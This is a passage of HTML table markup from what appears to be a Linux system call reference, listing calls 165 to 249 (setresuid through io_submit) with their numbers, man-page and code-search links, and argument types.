href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0xa4</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0xa5</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td>vm86</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vm86.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vm86">cs/</a></td><td align="center">0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">167</td><td>query_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/query_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*query_module">cs/</a></td><td align="center">0xa7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">168</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0xa8</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">170</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0xaa</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0xab</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">173</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">174</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0xae</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0xaf</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0xb0</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0xb1</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0xb2</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0xb3</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0xb4</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0xb5</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0xb6</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">183</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0xb7</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">184</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0xba</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>getpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpmsg">cs/</a></td><td align="center">0xbc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">189</td><td>putpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/putpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*putpmsg">cs/</a></td><td align="center">0xbd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">190</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>ugetrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ugetrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ugetrlimit">cs/</a></td><td align="center">0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">192</td><td>mmap2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap2">cs/</a></td><td align="center">0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">193</td><td>truncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate64">cs/</a></td><td align="center">0xc1</td><td>const char *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>ftruncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate64">cs/</a></td><td align="center">0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>stat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat64">cs/</a></td><td align="center">0xc3</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>lstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat64">cs/</a></td><td align="center">0xc4</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>fstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat64">cs/</a></td><td align="center">0xc5</td><td>unsigned long fd</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown32">cs/</a></td><td align="center">0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">199</td><td>getuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid32">cs/</a></td><td align="center">0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">200</td><td>getgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid32">cs/</a></td><td align="center">0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">201</td><td>geteuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid32">cs/</a></td><td align="center">0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">202</td><td>getegid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid32">cs/</a></td><td align="center">0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">203</td><td>setreuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid32">cs/</a></td><td align="center">0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">204</td><td>setregid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid32">cs/</a></td><td align="center">0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">205</td><td>getgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups32">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>setgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups32">cs/</a></td><td align="center">0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">207</td><td>fchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown32">cs/</a></td><td align="center">0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">208</td><td>setresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid32">cs/</a></td><td align="center">0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">209</td><td>getresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid32">cs/</a></td><td align="center">0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">210</td><td>setresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid32">cs/</a></td><td align="center">0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">211</td><td>getresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid32">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>chown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown32">cs/</a></td><td align="center">0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">213</td><td>setuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid32">cs/</a></td><td align="center">0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">214</td><td>setgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid32">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>setfsuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid32">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>setfsgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid32">cs/</a></td><td align="center">0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">217</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0xd9</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xdc</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fcntl64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl64">cs/</a></td><td align="center">0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">223</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">224</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xe2</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">227</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xe3</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">228</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xe4</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">229</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xe5</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xe6</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xe7</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xe8</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xe9</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xea</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xeb</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xec</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">237</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xed</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>sendfile64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile64">cs/</a></td><td align="center">0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">240</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xf0</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">241</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>set_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_thread_area">cs/</a></td><td align="center">0xf3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">244</td><td>get_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_thread_area">cs/</a></td><td align="center">0xf4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">245</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">246</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">248</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">249</td><td>io_cancel</td><td 